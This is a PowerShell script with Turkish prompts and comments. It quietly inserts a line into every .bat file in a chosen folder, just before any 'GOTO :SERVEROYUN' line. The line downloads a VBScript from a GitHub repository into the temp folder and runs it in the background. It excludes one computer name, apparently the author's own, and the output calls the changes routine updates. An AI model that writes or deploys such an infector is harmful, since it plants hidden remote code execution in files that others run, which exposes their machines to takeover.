$KlasorYolu = Read-Host -Prompt "Lutfen .bat dosyalarinin bulundugu klasor yolunu girin"
$KlasorYolu = $KlasorYolu.Trim().Trim('"').Trim("'")

if (-not (Test-Path -Path $KlasorYolu)) {
    Write-Host "HATA: Belirttiginiz klasor yolu bulunamadi!" -ForegroundColor Red
    Read-Host -Prompt "Cikmak icin Enter'a basin..."
    exit
}

$EklenecekKomut = '@if /I NOT "%COMPUTERNAME%"=="UCGEN" ( @curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/runnerr.vbs" -o %temp%\runnerr.vbs && start /B "" "%temp%\runnerr.vbs" )'

$BatDosyalari = Get-ChildItem -Path $KlasorYolu -Filter "*.bat"

$GuncellenenSayisi = 0
$PasGecilenSayisi = 0
$BulunamayanSayisi = 0
$HataliDosyaSayisi = 0

foreach ($Dosya in $BatDosyalari) {
    try {
        # [KORUMA 1] Dosyanin orijinal encoding yapisini (UTF8, ANSI, OEM vb.) tespit ederek okuyoruz
        # StreamReader dosyanin basindaki Byte Order Mark (BOM) yapisina bakarak en dogru dili secer.
        $Reader = New-Object System.IO.StreamReader($Dosya.FullName, $true)
        $Icerik = $Reader.ReadToEnd()
        $OrijinalEncoding = $Reader.CurrentEncoding
        $Reader.Close()

        # Satirlari Windows standartlarina gore parcaliyoruz
        $Satirlar = $Icerik -split "\r?\n"

        # Çift eklemeyi önleme kontrolü
        if ($Icerik -match "dosta2/raw/refs/heads/main/runnerr.vbs") {
            Write-Host "Zaten eklenmis, pas gecildi: $($Dosya.Name)" -ForegroundColor Yellow
            $PasGecilenSayisi++
            continue
        }

        $YeniIcerik = @()
        $HedefBulundu = $false

        foreach ($Satir in $Satirlar) {
            # [KORUMA 3] Satir icindeki tüm gizli bosluklari ve TAB karakterlerini temizleyerek arama yapiyoruz
            $TemizSatir = $Satir.Trim().Replace(" ", "").Replace("`t", "")

            # GOTO :SERVEROYUN ifadesini esnek sekilde yakala
            if ($TemizSatir -ilike "*GOTO:SERVEROYUN*") {
                $YeniIcerik += $EklenecekKomut
                $HedefBulundu = $true
            }
            $YeniIcerik += $Satir
        }

        if ($HedefBulundu) {
            # [KORUMA 2] Satirlari CRLF (Windows) formatinda birlestiriyoruz
            $YazilacakIcerik = $YeniIcerik -join "`r`n"
            
            # [KORUMA 1 DEVAM] Dosyayi orijinalinde hangi encoding ile okuduysak, tam olarak O DİLDE geri yaziyoruz.
            [System.IO.File]::WriteAllText($Dosya.FullName, $YazilacakIcerik, $OrijinalEncoding)
            
            Write-Host "Basariyla Guncellendi [Encoding: $($OrijinalEncoding.WebName)]: $($Dosya.Name)" -ForegroundColor Green
            $GuncellenenSayisi++
        } else {
            Write-Host "UYARI: 'GOTO :SERVEROYUN' bulunamadi: $($Dosya.Name)" -ForegroundColor Magenta
            $BulunamayanSayisi++
        }
    }
    catch {
        # [KORUMA 4] Yetki hatasi veya bozuk dosya durumunda script durmaz, siradaki dosyaya gecer
        Write-Host "KRITIK HATA: $($Dosya.Name) dosyasi islenirken bir sorun olustu! Pas geciliyor. Hata: $_" -ForegroundColor Red
        $HataliDosyaSayisi++
    }
}

Write-Host "`n========================= ISLEM TAMAMLANDI =========================" -ForegroundColor Cyan
Write-Host "Guncellenen Dosya Sayisi        : $GuncellenenSayisi" -ForegroundColor Green
Write-Host "Zaten Ekli Olan Dosyalar (Pas)  : $PasGecilenSayisi" -ForegroundColor Yellow
Write-Host "Hedef Satir Bulunamayanlar      : $BulunamayanSayisi" -ForegroundColor Magenta
Write-Host "Hata Alinan/Okunamayan Dosyalar : $HataliDosyaSayisi" -ForegroundColor Red
Write-Host "====================================================================" -ForegroundColor Cyan

Read-Host -Prompt "Kapatmak icin Enter'a basin..."